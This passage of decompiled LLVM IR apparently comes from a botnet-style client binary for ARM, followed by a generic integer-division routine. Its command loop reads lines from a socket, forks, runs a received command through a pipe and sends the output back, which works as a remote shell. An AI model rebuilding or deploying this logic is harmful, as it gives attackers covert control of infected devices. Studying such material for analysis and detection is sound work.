dec_label_pc_12110:                               ; preds = %dec_label_pc_120ac, %dec_label_pc_120ec
  %v3_12120 = call i32 @strlen(i8* %v5_120e4)
  %v2_12128 = add i32 %v1_12114, %v3_12120
  %v1_1212c = inttoptr i32 %v2_12128 to i8*
  %v2_1212c = load i8, i8* %v1_1212c, align 1
  %v7_12130 = icmp eq i8 %v2_1212c, 10
  br i1 %v7_12130, label %dec_label_pc_120ec, label %dec_label_pc_12138

dec_label_pc_12138:                               ; preds = %dec_label_pc_12110
  store i32 %v1_12114, i32* @r4, align 4
  %v3_12148 = call i32 @strlen(i8* %v5_120e4)
  %v0_12150 = load i32, i32* @r4, align 4
  %v2_12150 = add i32 %v0_12150, %v3_12148
  %v1_12154 = inttoptr i32 %v2_12150 to i8*
  %v2_12154 = load i8, i8* %v1_12154, align 1
  %v7_12158 = icmp eq i8 %v2_12154, 13
  br i1 %v7_12158, label %dec_label_pc_120ec, label %dec_label_pc_12160

dec_label_pc_12160:                               ; preds = %dec_label_pc_12138
  %v2_1217c28 = load i8, i8* %v5_120e4, align 1
  %v7_1218032 = icmp eq i8 %v2_1217c28, 32
  br i1 %v7_1218032, label %dec_label_pc_12198, label %dec_label_pc_12188

dec_label_pc_1216c:                               ; preds = %dec_label_pc_12188
  %v1_12170 = add i32 %v4_1217834, 1
  %v5_12174 = inttoptr i32 %v1_12170 to i8*
  %v2_1217c = load i8, i8* %v5_12174, align 1
  %v7_12180 = icmp eq i8 %v2_1217c, 32
  br i1 %v7_12180, label %dec_label_pc_12198, label %dec_label_pc_12188

dec_label_pc_12188:                               ; preds = %dec_label_pc_12160, %dec_label_pc_1216c
  %v4_1217834 = phi i32 [ %v1_12170, %dec_label_pc_1216c ], [ %v1_120e0, %dec_label_pc_12160 ]
  %stack_var_-64.033 = phi i8* [ %v5_12174, %dec_label_pc_1216c ], [ %v5_120e4, %dec_label_pc_12160 ]
  %v2_1218c = load i8, i8* %stack_var_-64.033, align 1
  %v2_12190 = icmp eq i8 %v2_1218c, 0
  br i1 %v2_12190, label %dec_label_pc_12198, label %dec_label_pc_1216c

dec_label_pc_12198:                               ; preds = %dec_label_pc_1216c, %dec_label_pc_12188, %dec_label_pc_12160
  %stack_var_-64.0.lcssa = phi i8* [ %v5_120e4, %dec_label_pc_12160 ], [ %v5_12174, %dec_label_pc_1216c ], [ %stack_var_-64.033, %dec_label_pc_12188 ]
  %v4_12178.lcssa = phi i32 [ %v1_120e0, %dec_label_pc_12160 ], [ %v1_12170, %dec_label_pc_1216c ], [ %v4_1217834, %dec_label_pc_12188 ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v1_121a8 = add i32 %v4_12178.lcssa, 1
  %v2_121ec39 = load i8, i8* %v5_120e4, align 1
  %v2_121f041 = icmp eq i8 %v2_121ec39, 0
  br i1 %v2_121f041, label %dec_label_pc_121f8, label %dec_label_pc_121bc

dec_label_pc_121bc:                               ; preds = %dec_label_pc_12198, %dec_label_pc_121bc
  %storemerge743 = phi i8* [ %storemerge7, %dec_label_pc_121bc ], [ %v5_120e4, %dec_label_pc_12198 ]
  %storemerge1442 = phi i32 [ %v1_121e0, %dec_label_pc_121bc ], [ %v1_120e0, %dec_label_pc_12198 ]
  %v2_121c0 = load i8, i8* %storemerge743, align 1
  %v3_121c0 = zext i8 %v2_121c0 to i32
  %v1_121c8 = call i32 @__GI_toupper(i32 %v3_121c0)
  %v1_121d8 = trunc i32 %v1_121c8 to i8
  store i8 %v1_121d8, i8* %storemerge743, align 1
  %v1_121e0 = add i32 %storemerge1442, 1
  %storemerge7 = inttoptr i32 %v1_121e0 to i8*
  %v2_121ec = load i8, i8* %storemerge7, align 1
  %v2_121f0 = icmp eq i8 %v2_121ec, 0
  br i1 %v2_121f0, label %dec_label_pc_121f8, label %dec_label_pc_121bc

dec_label_pc_121f8:                               ; preds = %dec_label_pc_121bc, %dec_label_pc_12198
  store i32 ptrtoint ([3 x i8]* @global_var_1fd7c.802 to i32), i32* @r1, align 4
  %v4_12204 = call i32 @__GI_strcoll(i8* %v5_120e4, i32 ptrtoint ([3 x i8]* @global_var_1fd7c.802 to i32))
  store i32 %v4_12204, i32* @r0, align 4
  %v2_1220c = icmp eq i32 %v4_12204, 0
  br i1 %v2_1220c, label %dec_label_pc_12214, label %dec_label_pc_1231c

dec_label_pc_12214:                               ; preds = %dec_label_pc_121f8
  %v0_12214 = call i32 @listFork()
  %v2_1221c = icmp eq i32 %v0_12214, 0
  br i1 %v2_1221c, label %dec_label_pc_12224, label %dec_label_pc_124b0.outer

dec_label_pc_12224:                               ; preds = %dec_label_pc_12214
  store i32 1024, i32* @r2, align 4
  %v3_1223c = call i32 @__GI_memset(i8* %v2_1223c, i32 0)
  %v6_1225c = call i32 @szprintf(i32 %v2_1222c, i32 ptrtoint ([8 x i8]* @global_var_1fd80.804 to i32), i32 %v1_121a8, i32 %v2_1222c, i32 ptrtoint (i32* @0 to i32))
  %v3_12278 = call i32 @fdpopen(i32 %v2_1222c, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1fd1c.777, i32 0, i32 0))
  br label %dec_label_pc_122e4

dec_label_pc_12288:                               ; preds = %dec_label_pc_122e4
  %v2_12298 = call i32 @trim(i8* %v2_1223c)
  %v2_122a0 = load i32, i32* @global_var_299a0.50, align 4
  store i32 %v2_1222c, i32* @r2, align 4
  %v3_122bc = call i32 @sockprintf(i32 %v2_122a0, i32 ptrtoint ([3 x i8]* @global_var_1fd88.806 to i32))
  store i32 1024, i32* @r2, align 4
  %v3_122d8 = call i32 @__GI_memset(i8* %v2_1223c, i32 0)
  %v1_122e0 = call i32 @sleep(i32 1)
  br label %dec_label_pc_122e4

dec_label_pc_122e4:                               ; preds = %dec_label_pc_12224, %dec_label_pc_12288
  %v4_122fc = call i32 @fdgets(i32 %v2_1222c, i32 1024, i32 %v3_12278, i32 %v2_1222c)
  %v2_12304 = icmp eq i32 %v4_122fc, 0
  br i1 %v2_12304, label %dec_label_pc_1230c, label %dec_label_pc_12288

dec_label_pc_1230c:                               ; preds = %dec_label_pc_122e4
  %v1_12310 = call i32 @fdpclose(i32 %v3_12278)
  %v1_12318 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_1231c

dec_label_pc_1231c:                               ; preds = %dec_label_pc_121f8, %dec_label_pc_1230c
  %v2_12330 = call i32 @__GI_strtok(i32 %v1_121a8, i32 ptrtoint (i32* @global_var_1fd8c.808 to i32))
  store i32 %v1_120e0, i32* %stack_var_-624, align 4
  %v2_1243446 = icmp eq i32 %v2_12330, 0
  br i1 %v2_1243446, label %dec_label_pc_1243c, label %dec_label_pc_12348

dec_label_pc_12348:                               ; preds = %dec_label_pc_1231c, %dec_label_pc_1241c
  %stack_var_-36.049.in = phi i32 [ %v2_12424, %dec_label_pc_1241c ], [ %v2_12330, %dec_label_pc_1231c ]
  %stack_var_-40.147 = phi i32 [ %stack_var_-40.0, %dec_label_pc_1241c ], [ 1, %dec_label_pc_1231c ]
  %stack_var_-36.049 = inttoptr i32 %stack_var_-36.049.in to i8*
  %v2_1234c = load i8, i8* %stack_var_-36.049, align 1
  %v7_12350 = icmp eq i8 %v2_1234c, 10
  br i1 %v7_12350, label %dec_label_pc_1241c, label %dec_label_pc_12358

dec_label_pc_12358:                               ; preds = %dec_label_pc_12348
  store i32 %stack_var_-40.147, i32* @r4, align 4
  %v3_12364 = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_1236c = add i32 %v3_12364, 1
  %v1_12374 = call i32 @malloc(i32 %v1_1236c)
  %v0_12388 = load i32, i32* @r4, align 4
  %v3_12388 = mul i32 %v0_12388, 4
  %v2_12394 = add i32 %v2_12390, %v3_12388
  %v2_12398 = inttoptr i32 %v2_12394 to i32*
  store i32 %v1_12374, i32* %v2_12398, align 4
  %v3_123a8 = mul i32 %stack_var_-40.147, 4
  %v2_123b0 = add i32 %v3_123a8, %v19_118a8
  %v2_123b4 = add i32 %v2_123b0, -600
  %v1_123b8 = inttoptr i32 %v2_123b4 to i32*
  %v2_123b8 = load i32, i32* %v1_123b8, align 4
  store i32 %v2_123b8, i32* @r4, align 4
  %v3_123c4 = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_123cc = add i32 %v3_123c4, 1
  %v0_123d0 = load i32, i32* @r4, align 4
  store i32 %v1_123cc, i32* @r2, align 4
  %v2_123dc = inttoptr i32 %v0_123d0 to i8*
  %v3_123dc = call i32 @__GI_memset(i8* %v2_123dc, i32 0)
  %v2_123fc = load i32, i32* %v1_123b8, align 4
  store i32 %stack_var_-36.049.in, i32* @r1, align 4
  %v3_1240c = inttoptr i32 %v2_123fc to i8*
  %v4_1240c = call i32 @strcpy(i8* %v3_1240c, i32 %stack_var_-36.049.in)
  %v1_12414 = add i32 %stack_var_-40.147, 1
  br label %dec_label_pc_1241c

dec_label_pc_1241c:                               ; preds = %dec_label_pc_12348, %dec_label_pc_12358
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.147, %dec_label_pc_12348 ], [ %v1_12414, %dec_label_pc_12358 ]
  %v2_12424 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1fd8c.808 to i32))
  %v2_12434 = icmp eq i32 %v2_12424, 0
  br i1 %v2_12434, label %dec_label_pc_1243c, label %dec_label_pc_12348

dec_label_pc_1243c:                               ; preds = %dec_label_pc_1241c, %dec_label_pc_1231c
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_1231c ], [ %stack_var_-40.0, %dec_label_pc_1241c ]
  %v3_12448 = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-624)
  %v7_12454 = icmp slt i32 %stack_var_-40.1.lcssa, 2
  br i1 %v7_12454, label %dec_label_pc_124b0.outer, label %dec_label_pc_1246c.lr.ph

dec_label_pc_1246c.lr.ph:                         ; preds = %dec_label_pc_1243c
  br label %dec_label_pc_1246c

dec_label_pc_1246c:                               ; preds = %dec_label_pc_1246c.lr.ph, %dec_label_pc_1246c
  %storemerge15128 = phi i32 [ 1, %dec_label_pc_1246c.lr.ph ], [ %v1_12498, %dec_label_pc_1246c ]
  %v3_12478 = mul i32 %storemerge15128, 4
  %v2_12480 = add i32 %v3_12478, %v19_118a8
  %v2_12484 = add i32 %v2_12480, -600
  %v1_12488 = inttoptr i32 %v2_12484 to i32*
  %v2_12488 = load i32, i32* %v1_12488, align 4
  store i32 %v2_12488, i32* @r0, align 4
  %v0_12490 = call i32 @free()
  %v1_12498 = add nuw nsw i32 %storemerge15128, 1
  %v5_124ac = icmp slt i32 %v1_12498, %stack_var_-40.1.lcssa
  br i1 %v5_124ac, label %dec_label_pc_1246c, label %dec_label_pc_124b0.outer

dec_label_pc_124b0.outer:                         ; preds = %dec_label_pc_1246c, %dec_label_pc_12040, %dec_label_pc_12214, %dec_label_pc_1243c, %dec_label_pc_1209c, %dec_label_pc_11c4c
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph19, %dec_label_pc_11c4c ], [ %stack_var_-96.1, %dec_label_pc_1209c ], [ %stack_var_-96.1, %dec_label_pc_1243c ], [ %stack_var_-96.1, %dec_label_pc_12214 ], [ %stack_var_-96.1, %dec_label_pc_12040 ], [ %stack_var_-96.1, %dec_label_pc_1246c ]
  br label %dec_label_pc_124b0

dec_label_pc_124b0:                               ; preds = %dec_label_pc_124b0.outer, %dec_label_pc_11fcc
  %v2_124b4 = load i32, i32* @global_var_299a0.50, align 4
  %v5_124d0 = call i32 @recvLine(i32 %v2_124b4, i8* %v4_124d0, i32 4096, i32 %v2_124c0)
  %v3_124e0 = icmp eq i32 %v5_124d0, -1
  br i1 %v3_124e0, label %dec_label_pc_11c30.outer, label %dec_label_pc_11efc

; uselistorder directives
  uselistorder i32 %v5_124d0, { 1, 0 }
  uselistorder i32 %storemerge15128, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_12424, { 1, 0 }
  uselistorder i8* %stack_var_-36.049, { 2, 1, 0 }
  uselistorder i32 %stack_var_-40.147, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_121e0, { 1, 0 }
  uselistorder i8* %storemerge743, { 1, 0 }
  uselistorder i32 %v1_121a8, { 1, 0 }
  uselistorder i32 %v1_12114, { 2, 1, 0 }
  uselistorder i8* %v5_120e4, { 5, 0, 3, 2, 1, 4, 6, 8, 7 }
  uselistorder i32 %v1_120e0, { 3, 0, 2, 1, 4 }
  uselistorder i8* %storemerge8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v1_12018, { 1, 2, 0 }
  uselistorder i1 %v9_11f30, { 1, 0 }
  uselistorder i32 %v3_11f44, { 3, 2, 5, 0, 1, 4 }
  uselistorder i32 %v5_11e7c, { 1, 0 }
  uselistorder i32 %v3_11eb0, { 1, 2, 0, 3 }
  uselistorder i32 %v3_11e24, { 1, 0 }
  uselistorder i32 %v1_11e08, { 1, 0 }
  uselistorder i32 %v5_11d44, { 1, 0 }
  uselistorder i32 %v1_11cd8, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_11cf4, { 1, 0 }
  uselistorder i32 %v2_11ce8, { 1, 0 }
  uselistorder i32 %v2_1222c, { 2, 4, 3, 5, 1, 0 }
  uselistorder i8* %v4_124d0, { 3, 0, 1, 2 }
  uselistorder i32 %v2_124c0, { 7, 0, 3, 4, 5, 6, 1, 2 }
  uselistorder i32 %v2_11ba8, { 1, 0 }
  uselistorder i32 %v0_11b90, { 1, 0, 2, 3 }
  uselistorder i32 %v3_11b44, { 1, 0, 2 }
  uselistorder i32 %v2_11aa8, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-88.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1648, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 11, 10, 9, 8, 7, 6, 5, 4, 1, 0, 3, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @szprintf, { 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28 }
  uselistorder i32 ()* @listFork, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_299a8.68, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_2fc08.71, { 0, 2, 3, 4, 5, 6, 7, 8, 1, 9, 10 }
  uselistorder i32 (i32, i32)* @sockprintf, { 20, 19, 18, 17, 16, 15, 14, 7, 6, 5, 4, 3, 2, 1, 13, 12, 11, 10, 9, 8, 21, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_2fbfc.475, { 1, 0, 6, 2, 3, 4, 5 }
  uselistorder i32* @global_var_299a0.50, { 2, 3, 4, 5, 0, 1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 (i32)* @sleep, { 2, 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 -600, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 4, 3, 1, 2, 0 }
  uselistorder [2 x i8]* @global_var_1fd1c.777, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_1fd1c.777 to i32), { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 0, 1, 2, 3, 4, 5, 6, 21, 18 }
  uselistorder i32 ptrtoint (i32* @global_var_1fd04.773 to i32), { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_124b0.outer, { 0, 3, 2, 4, 1, 5 }
  uselistorder label %dec_label_pc_1246c, { 1, 0 }
  uselistorder label %dec_label_pc_1241c, { 1, 0 }
  uselistorder label %dec_label_pc_12348, { 1, 0 }
  uselistorder label %dec_label_pc_1231c, { 1, 0 }
  uselistorder label %dec_label_pc_122e4, { 1, 0 }
  uselistorder label %dec_label_pc_121bc, { 1, 0 }
  uselistorder label %dec_label_pc_12198, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12188, { 1, 0 }
  uselistorder label %dec_label_pc_12110, { 1, 0 }
  uselistorder label %dec_label_pc_1207c, { 1, 0 }
  uselistorder label %dec_label_pc_12040, { 1, 0 }
  uselistorder label %dec_label_pc_11f68, { 1, 0 }
  uselistorder label %dec_label_pc_11ef0, { 1, 0 }
  uselistorder label %dec_label_pc_11e60, { 1, 0 }
  uselistorder label %dec_label_pc_11d28, { 1, 0 }
  uselistorder label %dec_label_pc_11c40, { 1, 0 }
  uselistorder label %dec_label_pc_11c30.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11c18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11b8c, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_11a64, { 1, 0 }
  uselistorder label %dec_label_pc_119f0, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_12540 = load i32, i32* @r1, align 4
  %v1_12540 = add i32 %v0_12540, -1
  store i32 %v1_12540, i32* %r2.global-to-local, align 4
  %v2_12540 = icmp eq i32 %v0_12540, 0
  %v7_12540 = icmp eq i32 %v0_12540, 1
  %v0_12544 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_12540, i32 %v0_12544)
  br i1 %v2_12540, label %dec_label_pc_12628, label %dec_label_pc_1254c

dec_label_pc_1254c:                               ; preds = %entry
  %v0_1254c = load i32, i32* %r0.global-to-local, align 4
  %v1_1254c = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_1254c, %v1_1254c
  br i1 %tmp, label %dec_label_pc_12554, label %dec_label_pc_125e0

dec_label_pc_12554:                               ; preds = %dec_label_pc_1254c
  %v1_12554 = load i32, i32* %r2.global-to-local, align 4
  %v2_12554 = and i32 %v1_12554, %v1_1254c
  %v4_12554 = icmp eq i32 %v2_12554, 0
  br i1 %v4_12554, label %dec_label_pc_125ec, label %dec_label_pc_1255c

dec_label_pc_1255c:                               ; preds = %dec_label_pc_12554
  %v3_1255c = icmp ult i32 %v1_1254c, 536870912
  br i1 %v3_1255c, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1255c
  %v4_12560 = mul i32 %v1_1254c, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1255c, %.thread
  %v0_12580.pr36.ph = phi i32 [ %v4_12560, %.thread ], [ %v1_1254c, %dec_label_pc_1255c ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1255c ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_12580.pr36 = phi i32 [ %v4_12574, %bb81 ], [ %v0_12580.pr36.ph, %.preheader.preheader ]
  %v1_12578 = phi i32 [ %v4_12578, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_1256c = icmp ugt i32 %v0_12580.pr36, 268435455
  br i1 %v2_1256c, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_12580thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_12570 = icmp ult i32 %v0_12580.pr36, %v0_1254c
  br i1 %v4_12570, label %bb80, label %dec_label_pc_12580thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_12574 = and i32 %v0_12580.pr36, 268435456
  %v3_12574 = icmp eq i32 %v2_12574, 0
  %v4_12574 = mul i32 %v0_12580.pr36, 16
  br i1 %v3_12574, label %bb81, label %dec_label_pc_12580.loopexit

bb81:                                             ; preds = %bb80
  %v2_12578 = and i32 %v1_12578, 268435456
  %v3_12578 = icmp eq i32 %v2_12578, 0
  %v4_12578 = mul i32 %v1_12578, 16
  br i1 %v3_12578, label %.preheader, label %dec_label_pc_12580thread-pre-split.loopexit.loopexit

dec_label_pc_12580thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_1258c48.ph = phi i32 [ %v1_12578, %bb ], [ %v4_12578, %bb81 ]
  %v0_12580.pr38.ph = phi i32 [ %v0_12580.pr36, %bb ], [ %v4_12574, %bb81 ]
  br label %dec_label_pc_12580thread-pre-split.loopexit

dec_label_pc_12580thread-pre-split.loopexit:      ; preds = %dec_label_pc_12580thread-pre-split.loopexit.loopexit, %.thread2
  %v1_1258c48 = phi i32 [ %v1_12578, %.thread2 ], [ %v1_1258c48.ph, %dec_label_pc_12580thread-pre-split.loopexit.loopexit ]
  %v0_12580.pr38 = phi i32 [ %v0_12580.pr36, %.thread2 ], [ %v0_12580.pr38.ph, %dec_label_pc_12580thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12580thread-pre-split

dec_label_pc_12580thread-pre-split:               ; preds = %dec_label_pc_12580thread-pre-split.loopexit, %bb83
  %v1_1258c46 = phi i32 [ %v1_1258c48, %dec_label_pc_12580thread-pre-split.loopexit ], [ %v3_1258c, %bb83 ]
  %v0_12580.pr = phi i32 [ %v0_12580.pr38, %dec_label_pc_12580thread-pre-split.loopexit ], [ %v3_12588, %bb83 ]
  br label %dec_label_pc_12580

dec_label_pc_12580.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_12580

dec_label_pc_12580:                               ; preds = %dec_label_pc_12580.loopexit, %dec_label_pc_12580thread-pre-split
  %v1_1258c = phi i32 [ %v1_1258c46, %dec_label_pc_12580thread-pre-split ], [ %v1_12578, %dec_label_pc_12580.loopexit ]
  %v1_12588 = phi i32 [ %v0_12580.pr, %dec_label_pc_12580thread-pre-split ], [ %v4_12574, %dec_label_pc_12580.loopexit ]
  %v2_12580 = icmp slt i32 %v1_12588, 0
  br i1 %v2_12580, label %dec_label_pc_12594, label %bb82

bb82:                                             ; preds = %dec_label_pc_12580
  %v4_12584 = icmp ult i32 %v1_12588, %v0_1254c
  br i1 %v4_12584, label %bb83, label %dec_label_pc_12594

bb83:                                             ; preds = %bb82
  %v3_12588 = mul i32 %v1_12588, 2
  %v2_1258c = icmp slt i32 %v1_1258c, 0
  %v3_1258c = mul i32 %v1_1258c, 2
  br i1 %v2_1258c, label %dec_label_pc_12594, label %dec_label_pc_12580thread-pre-split

dec_label_pc_12594:                               ; preds = %bb82, %dec_label_pc_12580, %bb83
  %v2_125a059 = phi i32 [ %v3_1258c, %bb83 ], [ %v1_1258c, %bb82 ], [ %v1_1258c, %dec_label_pc_12580 ]
  %v1_1259851 = phi i32 [ %v3_12588, %bb83 ], [ %v1_12588, %bb82 ], [ %v1_12588, %dec_label_pc_12580 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12598

dec_label_pc_12598:                               ; preds = %.thread11, %dec_label_pc_12594
  %v1_125cc = phi i32 [ %v4_125cc, %.thread11 ], [ %v2_125a059, %dec_label_pc_12594 ]
  %v1_125a0 = phi i32 [ %v0_125d8, %.thread11 ], [ 0, %dec_label_pc_12594 ]
  %v1_125d0 = phi i32 [ %v4_125d0, %.thread11 ], [ %v1_1259851, %dec_label_pc_12594 ]
  %v1_1259c = phi i32 [ %v0_125c8, %.thread11 ], [ %v0_1254c, %dec_label_pc_12594 ]
  %v3_12598 = icmp ult i32 %v1_1259c, %v1_125d0
  br i1 %v3_12598, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_12598
  %v3_1259c = sub i32 %v1_1259c, %v1_125d0
  store i32 %v3_1259c, i32* %r0.global-to-local, align 4
  %v3_125a0 = or i32 %v1_125a0, %v1_125cc
  store i32 %v3_125a0, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_12598, %bb84
  %v1_125a8 = phi i32 [ %v1_1259c, %dec_label_pc_12598 ], [ %v3_1259c, %bb84 ]
  %v1_125ac = phi i32 [ %v1_125a0, %dec_label_pc_12598 ], [ %v3_125a0, %bb84 ]
  %v4_125a4 = udiv i32 %v1_125d0, 2
  %v6_125a4 = icmp ult i32 %v1_125a8, %v4_125a4
  br i1 %v6_125a4, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_125a8 = urem i32 %v1_125d0, 2
  %v4_125a8 = icmp eq i32 %v3_125a8, 0
  %v6_125a8 = sub i32 %v1_125a8, %v4_125a4
  store i32 %v6_125a8, i32* %r0.global-to-local, align 4
  br i1 %v4_125a8, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_125ac = udiv i32 %v1_125cc, 2
  %v6_125ac = or i32 %v1_125ac, %v5_125ac
  store i32 %v6_125ac, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_125b4 = phi i32 [ %v6_125a8, %bb85 ], [ %v1_125a8, %.thread7 ], [ %v6_125a8, %bb86 ]
  %v1_125b8 = phi i32 [ %v1_125ac, %bb85 ], [ %v1_125ac, %.thread7 ], [ %v6_125ac, %bb86 ]
  %v4_125b0 = udiv i32 %v1_125d0, 4
  %v6_125b0 = icmp ult i32 %v1_125b4, %v4_125b0
  br i1 %v6_125b0, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_125b4 = and i32 %v1_125d0, 2
  %v4_125b4 = icmp eq i32 %v3_125b4, 0
  %v6_125b4 = sub i32 %v1_125b4, %v4_125b0
  store i32 %v6_125b4, i32* %r0.global-to-local, align 4
  br i1 %v4_125b4, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_125b8 = udiv i32 %v1_125cc, 4
  %v6_125b8 = or i32 %v1_125b8, %v5_125b8
  store i32 %v6_125b8, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_125c0 = phi i32 [ %v6_125b4, %bb87 ], [ %v1_125b4, %.thread8 ], [ %v6_125b4, %bb88 ]
  %v1_125c4 = phi i32 [ %v1_125b8, %bb87 ], [ %v1_125b8, %.thread8 ], [ %v6_125b8, %bb88 ]
  %v4_125bc = udiv i32 %v1_125d0, 8
  %v6_125bc = icmp ult i32 %v1_125c0, %v4_125bc
  br i1 %v6_125bc, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_125c0 = and i32 %v1_125d0, 4
  %v4_125c0 = icmp eq i32 %v3_125c0, 0
  %v6_125c0 = sub i32 %v1_125c0, %v4_125bc
  store i32 %v6_125c0, i32* %r0.global-to-local, align 4
  br i1 %v4_125c0, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_125c4 = udiv i32 %v1_125cc, 8
  %v6_125c4 = or i32 %v1_125c4, %v5_125c4
  store i32 %v6_125c4, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_125d8 = phi i32 [ %v1_125c4, %bb89 ], [ %v1_125c4, %.thread9 ], [ %v6_125c4, %bb90 ]
  %v0_125c8 = phi i32 [ %v6_125c0, %bb89 ], [ %v1_125c0, %.thread9 ], [ %v6_125c0, %bb90 ]
  %v2_125c8 = icmp eq i32 %v0_125c8, 0
  br i1 %v2_125c8, label %dec_label_pc_125d8, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_125cc, 16
  br i1 %tmp138, label %dec_label_pc_125d8, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_125cc = udiv i32 %v1_125cc, 16
  %v4_125d0 = udiv i32 %v1_125d0, 16
  br label %dec_label_pc_12598

dec_label_pc_125d8:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_125d8, i32* %r0.global-to-local, align 4
  ret i32 %v0_125d8

dec_label_pc_125e0:                               ; preds = %dec_label_pc_1254c
  %v9_1254c = icmp eq i32 %v0_1254c, %v1_1254c
